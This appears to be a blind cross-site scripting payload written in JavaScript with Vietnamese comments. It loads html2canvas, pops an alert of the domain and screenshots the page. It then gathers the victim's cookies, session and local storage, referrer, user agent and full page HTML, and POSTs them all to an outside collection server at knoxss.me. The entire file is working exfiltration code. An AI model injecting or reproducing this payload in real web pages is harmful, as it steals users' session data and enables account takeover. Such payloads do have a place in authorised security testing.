// Import thư viện html2canvas từ CDN
const script = document.createElement('script');
script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js';
document.head.appendChild(script);

// Khởi tạo biến để lưu base64 image
let base64image;
alert(document.domain)
// Chụp màn hình khi thư viện html2canvas đã được tải xong
script.onload = function() {
    // Chụp màn hình của toàn bộ tài liệu HTML
    html2canvas(document.documentElement).then(function(canvas) {
        // Chuyển đổi canvas thành base64 image
        base64image = canvas.toDataURL("image/png");

        // Tạo nội dung tin nhắn với base64 image
        var msg = 'VULNERABLE URL\n' + '';
        msg += '\n\nTRIGGER URL\n' + document.URL + '\n\nUSER AGENT\n' + navigator.userAgent;
        msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' + document.cookie;
        msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL STORAGE\n' + JSON.stringify(localStorage); 
        msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;
        msg += '\n\nSCREENSHOT\n' + base64image;

        // Gửi tin nhắn qua XMLHttpRequest
        var r = new XMLHttpRequest();
        var mailer = 'https://knoxss.me/00';
        r.open('POST', mailer, true);
        r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        r.send('origin=' + (document.location.origin === 'file://' ? 0 : document.location.origin) + '&msg=' + encodeURIComponent(msg) + '&id=' + 20119);
    });
};
